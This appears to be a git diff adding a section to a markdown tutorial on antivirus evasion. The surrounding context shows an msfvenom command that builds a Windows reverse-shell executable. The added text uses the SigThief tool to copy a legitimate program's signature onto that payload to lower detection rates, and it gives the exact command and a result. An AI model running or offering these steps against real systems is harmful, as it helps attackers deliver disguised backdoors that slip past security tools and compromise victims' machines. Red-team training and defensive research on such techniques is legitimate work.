@@ -27,3 +27,19 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip here> LPORT=<port here> -f e
 - Result
 
 ![Alt Text](https://i.ibb.co/rQrdx2j/basic-msf.png)
+
+### Using SigThief
+SigTheif is tool which takes a signature from a PE file and add that to another. Many Avs detect maalicous PE files based on signatures so this method can drop our detection rate to some extent.
+
+- Build command
+```
+python sigthief.py -i git-cmd.exe -t shivang_shell.exe -o shivang_shell_2.exe
+```
+
+- Result
+
+![Alt Text](https://i.ibb.co/BtSZkwQ/basic-msf-sig.png)
+
+Droping only 2 detection is not at all a huge move here . Although there are many combination which can be tried from SighTheif but for now let's leave it here
+
+```
